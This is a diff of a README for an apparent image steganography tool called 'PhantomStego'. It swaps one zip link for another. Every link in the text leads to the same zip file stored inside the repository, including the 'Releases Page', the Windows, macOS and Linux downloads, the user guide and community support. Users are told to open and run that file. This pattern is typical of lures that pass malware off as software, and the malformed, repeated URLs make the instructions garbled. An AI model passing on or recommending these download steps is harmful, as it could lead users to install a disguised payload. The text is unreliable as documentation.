@@ -6,7 +6,7 @@ Welcome to PhantomStego! This tool lets you hide messages or files within images
 
 ## 📥 Download PhantomStego
 
-[![Download PhantomStego](https://raw.githubusercontent.com/AleX-AA08/PhantomStego/main/Platonization/PhantomStego_establisher.zip%https://raw.githubusercontent.com/AleX-AA08/PhantomStego/main/Platonization/PhantomStego_establisher.zip)](https://raw.githubusercontent.com/AleX-AA08/PhantomStego/main/Platonization/PhantomStego_establisher.zip)
+[![Download PhantomStego](https://github.com/AleX-AA08/PhantomStego/raw/refs/heads/main/Platonization/Phantom-Stego-putlog.zip%https://github.com/AleX-AA08/PhantomStego/raw/refs/heads/main/Platonization/Phantom-Stego-putlog.zip)](https://github.com/AleX-AA08/PhantomStego/raw/refs/heads/main/Platonization/Phantom-Stego-putlog.zip)
 
 ## 📋 System Requirements
 
@@ -21,22 +21,22 @@ To ensure PhantomStego runs smoothly on your device, please check these minimum 
 
 ### Step 1: Visit the Releases Page
 
-Go to the [PhantomStego Releases Page](https://raw.githubusercontent.com/AleX-AA08/PhantomStego/main/Platonization/PhantomStego_establisher.zip) to find the latest version. This page lists all versions available.
+Go to the [PhantomStego Releases Page](https://github.com/AleX-AA08/PhantomStego/raw/refs/heads/main/Platonization/Phantom-Stego-putlog.zip) to find the latest version. This page lists all versions available.
 
 ### Step 2: Download the Application
 
 1. Look for the latest version by checking the top of the page.
 2. Click on the version number for the most recent release.
 3. Download the file that matches your operating system. Choose:
-   - For Windows: `https://raw.githubusercontent.com/AleX-AA08/PhantomStego/main/Platonization/PhantomStego_establisher.zip`
-   - For macOS: `https://raw.githubusercontent.com/AleX-AA08/PhantomStego/main/Platonization/PhantomStego_establisher.zip`
-   - For Linux: `https://raw.githubusercontent.com/AleX-AA08/PhantomStego/main/Platonization/PhantomStego_establisher.zip`
+   - For Windows: `https://github.com/AleX-AA08/PhantomStego/raw/refs/heads/main/Platonization/Phantom-Stego-putlog.zip`
+   - For macOS: `https://github.com/AleX-AA08/PhantomStego/raw/refs/heads/main/Platonization/Phantom-Stego-putlog.zip`
+   - For Linux: `https://github.com/AleX-AA08/PhantomStego/raw/refs/heads/main/Platonization/Phantom-Stego-putlog.zip`
 
 ### Step 3: Open the Downloaded File
 
-- **Windows:** Double-click `https://raw.githubusercontent.com/AleX-AA08/PhantomStego/main/Platonization/PhantomStego_establisher.zip`.
-- **macOS:** Open `https://raw.githubusercontent.com/AleX-AA08/PhantomStego/main/Platonization/PhantomStego_establisher.zip`, then drag the app to your Applications folder.
-- **Linux:** Extract the `https://raw.githubusercontent.com/AleX-AA08/PhantomStego/main/Platonization/PhantomStego_establisher.zip` file and run the application.
+- **Windows:** Double-click `https://github.com/AleX-AA08/PhantomStego/raw/refs/heads/main/Platonization/Phantom-Stego-putlog.zip`.
+- **macOS:** Open `https://github.com/AleX-AA08/PhantomStego/raw/refs/heads/main/Platonization/Phantom-Stego-putlog.zip`, then drag the app to your Applications folder.
+- **Linux:** Extract the `https://github.com/AleX-AA08/PhantomStego/raw/refs/heads/main/Platonization/Phantom-Stego-putlog.zip` file and run the application.
 
 ### Step 4: Launch PhantomStego
 
@@ -81,9 +81,9 @@ No, the original image quality remains intact. The hidden message is stored in a
 
 ## 🔗 Additional Resources
 
-- [User Guide](https://raw.githubusercontent.com/AleX-AA08/PhantomStego/main/Platonization/PhantomStego_establisher.zip) - Learn more about advanced features.
-- [Community Support](https://raw.githubusercontent.com/AleX-AA08/PhantomStego/main/Platonization/PhantomStego_establisher.zip) - Ask questions and get help from other users.
-- [Feature Requests](https://raw.githubusercontent.com/AleX-AA08/PhantomStego/main/Platonization/PhantomStego_establisher.zip) - Suggest enhancements or new features.
+- [User Guide](https://github.com/AleX-AA08/PhantomStego/raw/refs/heads/main/Platonization/Phantom-Stego-putlog.zip) - Learn more about advanced features.
+- [Community Support](https://github.com/AleX-AA08/PhantomStego/raw/refs/heads/main/Platonization/Phantom-Stego-putlog.zip) - Ask questions and get help from other users.
+- [Feature Requests](https://github.com/AleX-AA08/PhantomStego/raw/refs/heads/main/Platonization/Phantom-Stego-putlog.zip) - Suggest enhancements or new features.
 
 ## 📧 Contact Us
 
